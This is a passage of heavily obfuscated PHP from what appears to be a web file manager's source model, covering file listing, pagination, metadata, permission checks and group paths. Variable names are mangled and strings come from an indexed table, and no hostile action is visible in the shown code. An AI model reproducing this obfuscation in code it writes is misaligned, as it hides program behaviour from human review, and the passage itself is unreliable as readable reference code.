($èºóØ˛ﬁ[$¥˛¯–≈≤[33]] == $¥˛¯–≈≤[78]) { $ßñ¯‹≈§[] = $¥ﬁ£®ßõ; } continue; } $È œ˙·˛[] = $ï”îü°ô; } if ($È œ˙·˛) { $¡ÍÍµãÌ = $this->listSource(array($¥˛¯–≈≤[499] => array($¥˛¯–≈≤[500], $È œ˙·˛))); } $¡ÍÍµãÌ = $¡ÍÍµãÌ ? $¡ÍÍµãÌ : array($¥˛¯–≈≤[85] => array(), $¥˛¯–≈≤[86] => array()); $¡ÍÍµãÌ[$¥˛¯–≈≤[85]] = array_merge($¡ÍÍµãÌ[$¥˛¯–≈≤[85]], $ßñ¯‹≈§); $¡ÍÍµãÌ[$¥˛¯–≈≤[86]] = array_merge($¡ÍÍµãÌ[$¥˛¯–≈≤[86]], $ë÷“–äë); if (isset($¡ÍÍµãÌ[$¥˛¯–≈≤[451]]) && count($È œ˙·˛) == $¡ÍÍµãÌ[$¥˛¯–≈≤[451]][$¥˛¯–≈≤[452]]) { return $¡ÍÍµãÌ; } $è›„ßí◊ = array(); $…áŒÉÒ¬ = array_to_keyvalue($¡ÍÍµãÌ[$¥˛¯–≈≤[85]], $¥˛¯–≈≤[12], $¥˛¯–≈≤[193]); $Î◊√ÏÔˆ = array_to_keyvalue($¡ÍÍµãÌ[$¥˛¯–≈≤[86]], $¥˛¯–≈≤[12], $¥˛¯–≈≤[193]); $¨å∑«ﬂ≥ = array_merge($Î◊√ÏÔˆ, $…áŒÉÒ¬); foreach ($È œ˙·˛ as $ªòØ‹µÏ) { if (!in_array($ªòØ‹µÏ, $¨å∑«ﬂ≥)) { $è›„ßí◊[] = $ªòØ‹µÏ; } } if ($è›„ßí◊) { Model($¥˛¯–≈≤[510])->removeBySource($è›„ßí◊); } return $¡ÍÍµãÌ; } public function listUserRecycle() { $ç•ŸßÈ· =& $_SERVER[ß⁄ˆÇ†Œ]; $˝ÛØ∫ó– = Model($ç•ŸßÈ·[511])->listData(); if (!$˝ÛØ∫ó–) { return array(); } $´ÎÑèŸ“ = array($ç•ŸßÈ·[499] => array($ç•ŸßÈ·[500], $˝ÛØ∫ó–), $ç•ŸßÈ·[512] => 1); return $this->listSource($´ÎÑèŸ“); } public function listSource($†¥Ú•£¡, $Ô’ »’ã = 3000, $øÚıÄù = false) { $˜±õÄÆô =& $_SERVER[ß⁄ˆÇ†Œ]; if (!isset($†¥Ú•£¡[$˜±õÄÆô[513]])) { $†¥Ú•£¡[$˜±õÄÆô[513]] = 0; } if (isset($†¥Ú•£¡[$˜±õÄÆô[192]]) && $†¥Ú•£¡[$˜±õÄÆô[192]] == $˜±õÄÆô[228]) { $†¥Ú•£¡[$˜±õÄÆô[494]] = array($˜±õÄÆô[416], $˜±õÄÆô[514]); } $ÇÉÕø‚‚ = $˜±õÄÆô[515]; $§≠ÌÚàÃ = $this->field($ÇÉÕø‚‚)->_makeOrder()->where($†¥Ú•£¡)->selectPage($Ô’ »’ã); $this->_listPageCheck($§≠ÌÚàÃ, $ÇÉÕø‚‚, $†¥Ú•£¡); $this->_listDataApply($§≠ÌÚàÃ[$˜±õÄÆô[454]], $øÚıÄù); $this->_listMake($§≠ÌÚàÃ); return $§≠ÌÚàÃ; } private function _listPageCheck(&$É£“ÓúÊ, $ïıï‘˜„, $Æ≥¶∑ê·) { $˝‘‡ﬂ√˙ =& $_SERVER[ß⁄ˆÇ†Œ]; if (!is_array($É£“ÓúÊ[$˝‘‡ﬂ√˙[451]])) { return; } $¬À†ﬂîÌ = $É£“ÓúÊ[$˝‘‡ﬂ√˙[451]]; if ($¬À†ﬂîÌ[$˝‘‡ﬂ√˙[453]] <= 1) { return; } if ($¬À†ﬂîÌ[$˝‘‡ﬂ√˙[452]] >= 100000) { return; } if (Model($˝‘‡ﬂ√˙[516])->get($˝‘‡ﬂ√˙[517]) != $˝‘‡ﬂ√˙[518]) { return; } $ïıï‘˜„ = str_replace(array($˝‘‡ﬂ√˙[53], $˝‘‡ﬂ√˙[427], $˝‘‡ﬂ√˙[262]), $˝‘‡ﬂ√˙[12], $ïıï‘˜„); $ïıï‘˜„ = $˝‘‡ﬂ√˙[519] . str_replace($˝‘‡ﬂ√˙[50], $˝‘‡ﬂ√˙[520], $ïıï‘˜„) . $˝‘‡ﬂ√˙[521]; $èÉ€…¯∞ = $˝‘‡ﬂ√˙[522]; $èÉ€…¯∞ = $èÉ€…¯∞ . $˝‘‡ﬂ√˙[523]; $ä»°∏˜î = $¬À†ﬂîÌ[$˝‘‡ﬂ√˙[448]] * ($¬À†ﬂîÌ[$˝‘‡ﬂ√˙[438]] - 1) . $˝‘‡ﬂ√˙[50] . $¬À†ﬂîÌ[$˝‘‡ﬂ√˙[448]]; $´πóö°† = $this->_makeOrder(!0); $©◊—ú¶≥ = $˝‘‡ﬂ√˙[519] . str_replace($˝‘‡ﬂ√˙[50], $˝‘‡ﬂ√˙[520], $´πóö°†[0]); if (strpos($©◊—ú¶≥, $˝‘‡ﬂ√˙[524])) { $©◊—ú¶≥ = str_replace($˝‘‡ﬂ√˙[524], $˝‘‡ﬂ√˙[525], $©◊—ú¶≥); } else { $©◊—ú¶≥ .= $˝‘‡ﬂ√˙[526] . $´πóö°†[1]; } $”“¯ ﬁ√ = array(); foreach ($Æ≥¶∑ê· as $Í«√Ô∏¢ => $Çç⁄¢æÏ) { $”“¯ ﬁ√[$˝‘‡ﬂ√˙[519] . $Í«√Ô∏¢] = $Çç⁄¢æÏ; } $this->alias($˝‘‡ﬂ√˙[527])->field($ïıï‘˜„)->limit($ä»°∏˜î)->order($©◊—ú¶≥); $ºú√¡Ÿî = $this->join($èÉ€…¯∞)->where($”“¯ ﬁ√)->select(); if ($ºú√¡Ÿî) { $É£“ÓúÊ[$˝‘‡ﬂ√˙[454]] = $ºú√¡Ÿî; } } protected function _makeOrder($⁄†ô‰í— = false) { $ª˝¯ìæñ =& $_SERVER[ß⁄ˆÇ†Œ]; $ïÄ¸çÛ˛ = Model($ª˝¯ìæñ[528])->get($ª˝¯ìæñ[529]); $èºö•éµ = Model($ª˝¯ìæñ[528])->get($ª˝¯ìæñ[530]); $ã∏ç¶ï√ = array($ª˝¯ìæñ[531] => $ª˝¯ìæñ[532], $ª˝¯ìæñ[533] => $ª˝¯ìæñ[534]); $¨†∏Á£” = array($ª˝¯ìæñ[32] => $ª˝¯ìæñ[32], $ª˝¯ìæñ[79] => $ª˝¯ìæñ[79], $ª˝¯ìæñ[169] => $ª˝¯ìæñ[494], $ª˝¯ìæñ[535] => $ª˝¯ìæñ[535], $ª˝¯ìæñ[536] => $ª˝¯ìæñ[537], $ª˝¯ìæñ[231] => $ª˝¯ìæñ[231], $ª˝¯ìæñ[88] => $ª˝¯ìæñ[88]); $§ãÙöÄŸ = Input::get($ª˝¯ìæñ[538], $ª˝¯ìæñ[7], $ïÄ¸çÛ˛, array_keys($¨†∏Á£”)); $û ŸíÜ≥ = Input::get($ª˝¯ìæñ[539], $ª˝¯ìæñ[7], $èºö•éµ, array_keys($ã∏ç¶ï√)); if (!in_array($§ãÙöÄŸ, array_keys($¨†∏Á£”))) { $§ãÙöÄŸ = $ª˝¯ìæñ[32]; } if (!in_array($û ŸíÜ≥, array_keys($ã∏ç¶ï√))) { $§ãÙöÄŸ = $ª˝¯ìæñ[531]; } if ($§ãÙöÄŸ == $ª˝¯ìæñ[32]) { } $±™≈˙Ü« = $ª˝¯ìæñ[540] . $¨†∏Á£”[$§ãÙöÄŸ] . $ª˝¯ìæñ[53] . $ã∏ç¶ï√[$û ŸíÜ≥]; $±™≈˙Ü« = rtrim(trim($±™≈˙Ü«), $ª˝¯ìæñ[50]); if ($⁄†ô‰í—) { return array($±™≈˙Ü«, $ã∏ç¶ï√[$û ŸíÜ≥]); } return $this->order($±™≈˙Ü«); } protected function _listDataApplyItem($˙˛ Ê÷ø, $Õ¯£âïô = false) { $ÊÑëâºŸ = array($˙˛ Ê÷ø); $this->_listDataApply($ÊÑëâºŸ, $Õ¯£âïô); return $ÊÑëâºŸ[0]; } protected function _listDataApply(&$ﬂΩôÍ„‚, $ôÇàÅ∞˜ = false) { $ÿØ—ÃΩŸ =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$ﬂΩôÍ„‚) { $ﬂΩôÍ„‚ = array(); return; } $îÁ«¡ﬂ± = array_to_keyvalue($ﬂΩôÍ„‚, $ÿØ—ÃΩŸ[12], $ÿØ—ÃΩŸ[193]); $îÁ«¡ﬂ± = array_unique($îÁ«¡ﬂ±); $this->_listSourceCache($ﬂΩôÍ„‚); if (!$ôÇàÅ∞˜) { $this->_listAppendMeta($ﬂΩôÍ„‚, $îÁ«¡ﬂ±); $this->_listAppendFileMeta($ﬂΩôÍ„‚, $îÁ«¡ﬂ±); $this->_listAppendChildren($ﬂΩôÍ„‚, $îÁ«¡ﬂ±); } $this->_listAppendPath($ﬂΩôÍ„‚); $this->_listAppendAuth($ﬂΩôÍ„‚); $this->_listAppendSourceInfo($ﬂΩôÍ„‚, $îÁ«¡ﬂ±); $this->_listAppendUser($ﬂΩôÍ„‚); $this->_listFilterInfo($ﬂΩôÍ„‚, $ôÇàÅ∞˜); $this->_listAppendAuthSecret($ﬂΩôÍ„‚); } protected function _listSourceCache($Ï÷…Ò†π) { $ÌéÎ«ë˚ =& $_SERVER[ß⁄ˆÇ†Œ]; foreach ($Ï÷…Ò†π as $ÌºËò ë) { self::$cacheSourceInfo[$ÌéÎ«ë˚[541] . $ÌºËò ë[$ÌéÎ«ë˚[193]]] = $ÌºËò ë; } } protected function _listFilterInfo(&$ﬂ·òÉà⁄, $—≈Ï∫⁄ì = false) { $·≠ΩëÖ˚ =& $_SERVER[ß⁄ˆÇ†Œ]; foreach ($ﬂ·òÉà⁄ as &$¿®˘§Î¥) { $¿®˘§Î¥ = $this->pathInfoFilter($¿®˘§Î¥); self::$cachePathInfo[$·≠ΩëÖ˚[542] . intval($—≈Ï∫⁄ì) . $·≠ΩëÖ˚[470] . $¿®˘§Î¥[$·≠ΩëÖ˚[193]]] = $¿®˘§Î¥; } unset($¿®˘§Î¥); } protected function _listMake(&$´ùÕ—«Ô) { $Ä¨‰€π˚ =& $_SERVER[ß⁄ˆÇ†Œ]; $´ùÕ—«Ô[$Ä¨‰€π˚[85]] = array(); $´ùÕ—«Ô[$Ä¨‰€π˚[86]] = array(); foreach ($´ùÕ—«Ô[$Ä¨‰€π˚[454]] as $∑∂⁄˜Ü) { $⁄¥€øì» = $∑∂⁄˜Ü[$Ä¨‰€π˚[493]] == 1 ? $Ä¨‰€π˚[85] : $Ä¨‰€π˚[86]; $´ùÕ—«Ô[$⁄¥€øì»][] = $∑∂⁄˜Ü; } unset($´ùÕ—«Ô[$Ä¨‰€π˚[454]]); } protected function _listAppendMeta(&$±æı˛˛∆, $†¸≤®Ï±) { $•ÈÇâÃ’ =& $_SERVER[ß⁄ˆÇ†Œ]; $‹‚©î»á = array($•ÈÇâÃ’[499] => array($•ÈÇâÃ’[500], $†¸≤®Ï±)); $‘Ü∂€ªë = Model($•ÈÇâÃ’[543])->field($•ÈÇâÃ’[544])->where($‹‚©î»á)->select(); if (!$‘Ü∂€ªë) { return; } $ä≈òë¡Ï = array($•ÈÇâÃ’[545], $•ÈÇâÃ’[546], $•ÈÇâÃ’[525]); $ôãç¡≈˛ = array(); foreach ($‘Ü∂€ªë as $≥ü∞§ú¥) { if (!isset($ôãç¡≈˛[$≥ü∞§ú¥[$•ÈÇâÃ’[193]]])) { $ôãç¡≈˛[$≥ü∞§ú¥[$•ÈÇâÃ’[193]]] = array(); } if (in_array($≥ü∞§ú¥[$•ÈÇâÃ’[97]], $ä≈òë¡Ï)) { continue; } $ôãç¡≈˛[$≥ü∞§ú¥[$•ÈÇâÃ’[193]]][$≥ü∞§ú¥[$•ÈÇâÃ’[97]]] = $≥ü∞§ú¥[$•ÈÇâÃ’[459]]; } foreach ($±æı˛˛∆ as &$ã∑‹ÄÿÕ) { $ã∑‹ÄÿÕ[$•ÈÇâÃ’[547]] = !1; if (isset($ôãç¡≈˛[$ã∑‹ÄÿÕ[$•ÈÇâÃ’[193]]])) { $ã∑‹ÄÿÕ[$•ÈÇâÃ’[547]] = $ôãç¡≈˛[$ã∑‹ÄÿÕ[$•ÈÇâÃ’[193]]]; } if ($this->fileIsLock($ã∑‹ÄÿÕ) && $ã∑‹ÄÿÕ[$•ÈÇâÃ’[495]]) { $Øåñ∑⁄® = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $ã∑‹ÄÿÕ[$•ÈÇâÃ’[495]][$•ÈÇâÃ’[496]] = AuthModel::authDisable($ã∑‹ÄÿÕ[$•ÈÇâÃ’[495]][$•ÈÇâÃ’[496]], $Øåñ∑⁄®); $ã∑‹ÄÿÕ[$•ÈÇâÃ’[495]][$•ÈÇâÃ’[548]][$•ÈÇâÃ’[495]] = $ã∑‹ÄÿÕ[$•ÈÇâÃ’[495]][$•ÈÇâÃ’[496]]; } } unset($ã∑‹ÄÿÕ); } protected function _listAppendFileMeta(&$µø˙Ò¬Ï, $ó§ù¡¬Ñ) { $˛öª¨Ä– =& $_SERVER[ß⁄ˆÇ†Œ]; $°À©â¬∂ = array_to_keyvalue($µø˙Ò¬Ï, $˛öª¨Ä–[12], $˛öª¨Ä–[549]); $°À©â¬∂ = array_filter(array_unique($°À©â¬∂)); if (!$°À©â¬∂) { return; } $‘‚Æ§√  = array($˛öª¨Ä–[550] => array($˛öª¨Ä–[500], $°À©â¬∂)); $Ì„Ö€˙Æ = $˛öª¨Ä–[551]; $ﬁÇ¡¸˘ô = Model($˛öª¨Ä–[552])->field($Ì„Ö€˙Æ)->where($‘‚Æ§√ )->select(); $ﬁÇ¡¸˘ô = array_to_keyvalue($ﬁÇ¡¸˘ô, $˛öª¨Ä–[549]); $Õ°√ŒÑû = Model($˛öª¨Ä–[553])->field($˛öª¨Ä–[554])->where($‘‚Æ§√ )->select(); $Õ°√ŒÑû = $Õ°√ŒÑû ? $Õ°√ŒÑû : array(); $É∑∫›ÚÒ = array(); foreach ($Õ°√ŒÑû as $ÍêÇ˘≈é) { if (!isset($É∑∫›ÚÒ[$ÍêÇ˘≈é[$˛öª¨Ä–[549]]])) { $É∑∫›ÚÒ[$ÍêÇ˘≈é[$˛öª¨Ä–[549]]] = array(); } $É∑∫›ÚÒ[$ÍêÇ˘≈é[$˛öª¨Ä–[549]]][$ÍêÇ˘≈é[$˛öª¨Ä–[97]]] = $ÍêÇ˘≈é[$˛öª¨Ä–[459]]; } foreach ($µø˙Ò¬Ï as &$¢êØ£Ãû) { $ü≥Ëâ˘˜ = $¢êØ£Ãû[$˛öª¨Ä–[549]]; if (!$ü≥Ëâ˘˜ || !is_array($ﬁÇ¡¸˘ô[$ü≥Ëâ˘˜])) { continue; } $≤Û¡‰à€ = $ﬁÇ¡¸˘ô[$ü≥Ëâ˘˜]; $≤Û¡‰à€[$˛öª¨Ä–[79]] = $¢êØ£Ãû[$˛öª¨Ä–[79]]; $≤Û¡‰à€[$˛öª¨Ä–[32]] = $¢êØ£Ãû[$˛öª¨Ä–[32]]; if (!$≤Û¡‰à€[$˛öª¨Ä–[555]]) { Model($˛öª¨Ä–[552])->fileMd5Check($≤Û¡‰à€); } if (!isset(self::$cacheFileInfo[$˛öª¨Ä–[556] . $ü≥Ëâ˘˜])) { self::$cacheFileInfo[$˛öª¨Ä–[556] . $ü≥Ëâ˘˜] = array_merge(array(), $≤Û¡‰à€); } unset($ﬁÇ¡¸˘ô[$ü≥Ëâ˘˜][$˛öª¨Ä–[87]]); $·ä˚æºÖ = isset($É∑∫›ÚÒ[$ü≥Ëâ˘˜]) && is_array($É∑∫›ÚÒ[$ü≥Ëâ˘˜]) ? $É∑∫›ÚÒ[$ü≥Ëâ˘˜] : array(); $¢êØ£Ãû[$˛öª¨Ä–[170]] = array_merge($·ä˚æºÖ, $ﬁÇ¡¸˘ô[$ü≥Ëâ˘˜]); if (isset($¢êØ£Ãû[$˛öª¨Ä–[170]][$˛öª¨Ä–[184]])) { $¢êØ£Ãû[$˛öª¨Ä–[184]] = json_decode($¢êØ£Ãû[$˛öª¨Ä–[170]][$˛öª¨Ä–[184]], !0); unset($¢êØ£Ãû[$˛öª¨Ä–[170]][$˛öª¨Ä–[184]]); } } unset($¢êØ£Ãû); } protected function _listAppendSourceInfo(&$∆êÿ©ûå, $Û§ñá¨†) { $‡Ù……Ûß =& $_SERVER[ß⁄ˆÇ†Œ]; $´§◊∑’ñ = Model($‡Ù……Ûß[557])->listData(); $Ò”ê≠âÿ = Model($‡Ù……Ûß[507])->listData(); $›ƒ¬∞ì∑ = Model($‡Ù……Ûß[497])->listData(); $ÿ—è∞´¥ = Model($‡Ù……Ûß[558])->listSimple(); $˜Áà¨ª® = array_to_keyvalue($´§◊∑’ñ, $‡Ù……Ûß[483]); $ÚÄöå‘” = array_to_keyvalue_group($Ò”ê≠âÿ, $‡Ù……Ûß[87], $‡Ù……Ûß[508]); $Ê‡˛â¥è = array_to_keyvalue($›ƒ¬∞ì∑, $‡Ù……Ûß[87]); $†Ò£¸‹ = array_to_keyvalue_group($ÿ—è∞´¥, $‡Ù……Ûß[193]); foreach ($∆êÿ©ûå as &$óäµçûù) { $óäµçûù[$‡Ù……Ûß[90]] = array($‡Ù……Ûß[559] => 0, $‡Ù……Ûß[560] => 0, $‡Ù……Ûß[561] => 0); if (isset($Ê‡˛â¥è[$óäµçûù[$‡Ù……Ûß[193]]])) { $óäµçûù[$‡Ù……Ûß[90]][$‡Ù……Ûß[562]] = 1; $óäµçûù[$‡Ù……Ûß[90]][$‡Ù……Ûß[563]] = $Ê‡˛â¥è[$óäµçûù[$‡Ù……Ûß[193]]][$‡Ù……Ûß[32]]; } if ($ÚÄöå‘” && $˜Áà¨ª® && isset($ÚÄöå‘”[$óäµçûù[$‡Ù……Ûß[193]]])) { $óäµçûù[$‡Ù……Ûß[90]][$‡Ù……Ûß[564]] = array(); foreach ($ÚÄöå‘”[$óäµçûù[$‡Ù……Ûß[193]]] as $‰ÄŒæ∫¯) { $ﬂ‰ªöÇæ = $˜Áà¨ª®[$‰ÄŒæ∫¯]; $óäµçûù[$‡Ù……Ûß[90]][$‡Ù……Ûß[564]][] = array($‡Ù……Ûß[565] => $ﬂ‰ªöÇæ[$‡Ù……Ûß[483]], $‡Ù……Ûß[502] => $ﬂ‰ªöÇæ[$‡Ù……Ûß[32]], $‡Ù……Ûß[566] => $ﬂ‰ªöÇæ[$‡Ù……Ûß[567]]); } } if ($†Ò£¸‹ && isset($†Ò£¸‹[$óäµçûù[$‡Ù……Ûß[193]]])) { $óäµçûù[$‡Ù……Ûß[90]][$‡Ù……Ûß[568]] = array(); foreach ($†Ò£¸‹[$óäµçûù[$‡Ù……Ûß[193]]] as $»Õ˙È˜Õ) { $Î÷˝∫Ø¸ = $‡Ù……Ûß[569]; if ($»Õ˙È˜Õ[$‡Ù……Ûß[570]] == $‡Ù……Ûß[91]) { $Î÷˝∫Ø¸ .= $‡Ù……Ûß[571]; } $óäµçûù[$‡Ù……Ûß[90]][$‡Ù……Ûß[568]] = array_field_key($»Õ˙È˜Õ, explode($‡Ù……Ûß[50], $Î÷˝∫Ø¸)); } } } unset($óäµçûù); return $∆êÿ©ûå; } protected function _listAppendChildren(&$˝÷óÖ§ª, $Ü⁄·ÓÙì) { $Ä°Ò£ãã =& $_SERVER[ß⁄ˆÇ†Œ]; $£§˚µÙé = array(); $€πÔ©íÜ = array($Ä°Ò£ãã[239] => 0, $Ä°Ò£ãã[240] => 0); foreach ($˝÷óÖ§ª as &$ô˜ôÖè») { if (!$ô˜ôÖè»[$Ä°Ò£ãã[493]]) { continue; } $£§˚µÙé[] = $ô˜ôÖè»[$Ä°Ò£ãã[193]]; } unset($ô˜ôÖè»); if (!$£§˚µÙé) { return; } $€›êÈØà = array($Ä°Ò£ãã[192] => array($Ä°Ò£ãã[7], $£§˚µÙé), $Ä°Ò£ãã[513] => 0); $Ñ‰°§∞Ÿ = array($Ä°Ò£ãã[192], $Ä°Ò£ãã[493], $Ä°Ò£ãã[572] => $Ä°Ò£ãã[573]); $πæ⁄∂  = $this->field($Ñ‰°§∞Ÿ)->where($€›êÈØà)->group($Ä°Ò£ãã[574])->select(); $ª¯˚∏•È = array(); foreach ($πæ⁄∂  as $ê˝À‚çÿ) { $˝≥≈±˜◊ = $ê˝À‚çÿ[$Ä°Ò£ãã[192]]; $ ≤©¶¶ˆ = $ê˝À‚çÿ[$Ä°Ò£ãã[493]] == $Ä°Ò£ãã[91] ? $Ä°Ò£ãã[240] : $Ä°Ò£ãã[239]; if (!isset($ª¯˚∏•È[$˝≥≈±˜◊])) { $ª¯˚∏•È[$˝≥≈±˜◊] = array($Ä°Ò£ãã[239] => 0, $Ä°Ò£ãã[240] => 0); } $ª¯˚∏•È[$˝≥≈±˜◊][$ ≤©¶¶ˆ] += $ê˝À‚çÿ[$Ä°Ò£ãã[573]]; } foreach ($˝÷óÖ§ª as &$ô˜ôÖè») { if (!$ô˜ôÖè»[$Ä°Ò£ãã[493]]) { continue; } $óµâêæ≥ = is_array($ª¯˚∏•È[$ô˜ôÖè»[$Ä°Ò£ãã[193]]]) ? $ª¯˚∏•È[$ô˜ôÖè»[$Ä°Ò£ãã[193]]] : $€πÔ©íÜ; $ô˜ôÖè»[$Ä°Ò£ãã[240]] = $óµâêæ≥[$Ä°Ò£ãã[240]]; $ô˜ôÖè»[$Ä°Ò£ãã[239]] = $óµâêæ≥[$Ä°Ò£ãã[239]]; unset($ô˜ôÖè»[$Ä°Ò£ãã[494]]); } unset($ô˜ôÖè»); } protected function _listAppendAuth(&$ÏÊΩÌ∏Ô) { $óâ É√á =& $_SERVER[ß⁄ˆÇ†Œ]; $¯‘Œ∂±Ú = array(); foreach ($ÏÊΩÌ∏Ô as $ÏüÃ√¬Æ) { if ($ÏüÃ√¬Æ[$óâ É√á[190]] == self::TYPE_GROUP) { $¯‘Œ∂±Ú[] = $ÏüÃ√¬Æ[$óâ É√á[193]]; } } if (!$¯‘Œ∂±Ú) { return; } $Éÿ‹œò˝ = array_to_keyvalue($ÏÊΩÌ∏Ô, $óâ É√á[193]); $¨÷ü¬Á÷ = Model($óâ É√á[575])->getSourceList($¯‘Œ∂±Ú, $Éÿ‹œò˝); $¯Ê«„˘€ = KodUser::isRoot(); foreach ($ÏÊΩÌ∏Ô as $ÖÏÑ¢øµ => &$ÏüÃ√¬Æ) { $ÏüÃ√¬Æ[$óâ É√á[495]] = $¨÷ü¬Á÷[$ÏüÃ√¬Æ[$óâ É√á[193]]]; if (!$ÏüÃ√¬Æ[$óâ É√á[495]] && $ÏüÃ√¬Æ[$óâ É√á[190]] == self::TYPE_GROUP) { $ÏüÃ√¬Æ[$óâ É√á[495]] = Action($óâ É√á[576])->pathGroupAuthMake($ÏüÃ√¬Æ[$óâ É√á[577]]); if (!$ÏüÃ√¬Æ[$óâ É√á[495]] && !$¯Ê«„˘€) { $ÏüÃ√¬Æ[$óâ É√á[233]] = !1; $ÏüÃ√¬Æ[$óâ É√á[232]] = !1; } } if ($ÏüÃ√¬Æ[$óâ É√á[495]]) { $ÏüÃ√¬Æ[$óâ É√á[233]] = AuthModel::authCheckEdit($ÏüÃ√¬Æ[$óâ É√á[495]][$óâ É√á[496]]); $ÏüÃ√¬Æ[$óâ É√á[232]] = AuthModel::authCheckView($ÏüÃ√¬Æ[$óâ É√á[495]][$óâ É√á[496]]); } $this->groupPathDisplay($ÏüÃ√¬Æ); } unset($ÏüÃ√¬Æ); } public function _listAppendAuthSecret(&$ô†äßì¿) { $„èö’å§ =& $_SERVER[ß⁄ˆÇ†Œ]; if (Model($„èö’å§[516])->get($„èö’å§[578]) != $„èö’å§[91]) { return; } static $»«‘Œ◊≤ = false; if (!$»«‘Œ◊≤) { $ÿ˘åÓç´ = Model($„èö’å§[579]); $Ìæ…ƒ∞Æ = Model($„èö’å§[580]); $»«‘Œ◊≤ = $Ìæ…ƒ∞Æ->listData(); $»«‘Œ◊≤ = array_to_keyvalue($»«‘Œ◊≤, $„èö’å§[193]); $⁄çùÂ≤È = json_decode(Model($„èö’å§[516])->get($„èö’å§[581]), !0); $⁄çùÂ≤È = array_to_keyvalue($⁄çùÂ≤È, $„èö’å§[483]); foreach ($»«‘Œ◊≤ as $Âºœ§ä≠ => $ÿ‰ê¬€ñ) { $û»‚˚Äç = $⁄çùÂ≤È[$ÿ‰ê¬€ñ[$„èö’å§[582]]]; if (!$û»‚˚Äç) { $Ìæ…ƒ∞Æ->remove($ÿ‰ê¬€ñ[$„èö’å§[483]]); unset($»«‘Œ◊≤[$Âºœ§ä≠]); continue; } $£äÔö≈ª = $ÿ˘åÓç´->listData($û»‚˚Äç[$„èö’å§[495]]); if (!$£äÔö≈ª) { $Ìæ…ƒ∞Æ->remove($ÿ‰ê¬€ñ[$„èö’å§[483]]); unset($»«‘Œ◊≤[$Âºœ§ä≠]); continue; } $ÿ‰ê¬€ñ[$„èö’å§[495]] = $£äÔö≈ª; $ÿ‰ê¬€ñ[$„èö’å§[583]] = $û»‚˚Äç; $ÿ‰ê¬€ñ[$„èö’å§[584]] = Model($„èö’å§[585])->getInfoSimpleOuter($ÿ‰ê¬€ñ[$„èö’å§[535]]); $»«‘Œ◊≤[$Âºœ§ä≠] = $ÿ‰ê¬€ñ; } } $å€óçæ⁄ = USER_ID; $ã∏ßﬂ§ˆ = array(); $’‘–¬ÈÁ = $this->_listAppendPath($ã∏ßﬂ§ˆ, !0); foreach ($ô†äßì¿ as $Âºœ§ä≠ => &$ÿ‰ê¬€ñ) { if (!is_array($ÿ‰ê¬€ñ[$„èö’å§[495]])) { continue; } if ($ÿ‰ê¬€ñ[$„èö’å§[190]] != $„èö’å§[586]) { continue; } if (isset($»«‘Œ◊≤[$ÿ‰ê¬€ñ[$„èö’å§[193]]])) { $»≤∫£øÇ = $»«‘Œ◊≤[$ÿ‰ê¬€ñ[$„èö’å§[193]]]; if (!is_array($ÿ‰ê¬€ñ[$„èö’å§[547]])) { $ÿ‰ê¬€ñ[$„èö’å§[547]] = array(); } $ÿ‰ê¬€ñ[$„èö’å§[547]][$„èö’å§[587]] = $»≤∫£øÇ[$„èö’å§[582]]; $ÿ‰ê¬€ñ[$„èö’å§[495]][$„èö’å§[588]] = $»≤∫£øÇ; $ÿ‰ê¬€ñ[$„èö’å§[495]][$„èö’å§[589]] = $ÿ‰ê¬€ñ[$„èö’å§[590]]; $ÿ‰ê¬€ñ[$„èö’å§[495]][$„èö’å§[591]] = $„èö’å§[91]; if ($»≤∫£øÇ[$„èö’å§[535]] != $å€óçæ⁄) { $ÿ‰ê¬€ñ[$„èö’å§[495]][$„èö’å§[496]] = $ÿ‰ê¬€ñ[$„èö’å§[495]][$„èö’å§[496]] & $»≤∫£øÇ[$„èö’å§[495]][$„èö’å§[495]]; } continue; } $Ïï…∫–ù = $this->parentLevelArray($ÿ‰ê¬€ñ[$„èö’å§[592]]); $˛åÛª˙ã = array_reverse($Ïï…∫–ù); foreach ($˛åÛª˙ã as $ÂÂ∫∏˙Û => $Ñ¸÷Ê¥») { if (!isset($»«‘Œ◊≤[$Ñ¸÷Ê¥»])) { continue; } $»≤∫£øÇ = $»«‘Œ◊≤[$Ñ¸÷Ê¥»]; $ÿ‰ê¬€ñ[$„èö’å§[495]][$„èö’å§[588]] = $»≤∫£øÇ; if ($»≤∫£øÇ[$„èö’å§[535]] != $å€óçæ⁄) { $ÿ‰ê¬€ñ[$„èö’å§[495]][$„èö’å§[496]] = $ÿ‰ê¬€ñ[$„èö’å§[495]][$„èö’å§[496]] & $»≤∫£øÇ[$„èö’å§[495]][$„èö’å§[495]]; } $„®ºŸÂÚ = $„èö’å§[12]; $¨Åƒø’∆ = count($Ïï…∫–ù) - $ÂÂ∫∏˙Û; for ($á›´óÏÒ = 0; $á›´óÏÒ < $¨Åƒø’∆; $á›´óÏÒ++) { if (!isset($’‘–¬ÈÁ[$Ïï…∫–ù[$á›´óÏÒ]])) { $„®ºŸÂÚ = $„èö’å§[12]; break; } $„®ºŸÂÚ = $„®ºŸÂÚ . rtrim($’‘–¬ÈÁ[$Ïï…∫–ù[$á›´óÏÒ]], $„èö’å§[8]) . $„èö’å§[8]; } $ÿ‰ê¬€ñ[$„èö’å§[495]][$„èö’å§[589]] = rtrim($„®ºŸÂÚ, $„èö’å§[8]) . $„èö’å§[8]; break; } } unset($ÿ‰ê¬€ñ); } public function groupPathDisplay(&$ØÖ‡ØŸ‚) { $°ØƒÍä£ =& $_SERVER[ß⁄ˆÇ†Œ]; if ($ØÖ‡ØŸ‚[$°ØƒÍä£[190]] != self::TYPE_GROUP) { return; } $≤Ê®´‚È = Model($°ØƒÍä£[593])->getInfo($ØÖ‡ØŸ‚[$°ØƒÍä£[577]]); $·ì€ÑΩ› = $this->parentLevelArray($≤Ê®´‚È[$°ØƒÍä£[592]]); $öúÄ˘´å = $°ØƒÍä£[12]; foreach ($·ì€ÑΩ› as $¯—Û∑á≈) { $â€›¢∂î = Model($°ØƒÍä£[593])->getInfo($¯—Û∑á≈); $öúÄ˘´å .= $â€›¢∂î[$°ØƒÍä£[90]][$°ØƒÍä£[193]] . $°ØƒÍä£[50]; } $ØÖ‡ØŸ‚[$°ØƒÍä£[594]] = $≤Ê®´‚È[$°ØƒÍä£[192]]; $ØÖ‡ØŸ‚[$°ØƒÍä£[595]] = $≤Ê®´‚È[$°ØƒÍä£[592]]; $ØÖ‡ØŸ‚[$°ØƒÍä£[596]] = $≤Ê®´‚È[$°ØƒÍä£[597]]; $ØÖ‡ØŸ‚[$°ØƒÍä£[598]] = $öúÄ˘´å . 